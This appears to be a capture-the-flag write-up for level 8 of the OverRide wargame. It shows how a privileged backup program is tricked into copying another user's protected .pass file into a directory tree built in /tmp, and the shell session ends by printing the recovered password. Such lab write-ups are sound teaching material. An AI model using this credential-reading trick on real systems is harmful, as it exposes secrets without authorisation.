# Level 8

This one is very simple, the program takes a file and creates a backup in the backup folder. So what we want to do is create a backup of /home/users/level09/.pass but in order to do it, the folder ./backups/home/users/level09 needs to exist so it can write the backup file in it. The only place where we can create folders is /tmp so we do it in /tmp like so :

```bash
level08@OverRide:/tmp$ mkdir backups//home
level08@OverRide:/tmp$ mkdir backups//home/users
level08@OverRide:/tmp$ mkdir backups//home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/
home/ .log  
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
